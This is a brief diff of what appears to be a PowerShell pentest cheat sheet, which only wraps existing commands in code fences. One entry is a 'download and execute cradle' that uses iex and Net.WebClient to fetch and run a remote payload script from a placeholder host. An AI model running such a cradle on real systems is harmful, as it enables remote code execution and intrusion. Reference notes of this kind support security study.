@@ -7,10 +7,14 @@ Import-Module C:\path\to\script.ps1
 ```
 
 Find all commands in module
-	Get-Command -Module <modulename>
+```
+Get-Command -Module <modulename>
+```
 
 Download & Execute Cradle
-	iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
+```
+iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
+```
 
 ??
 ```
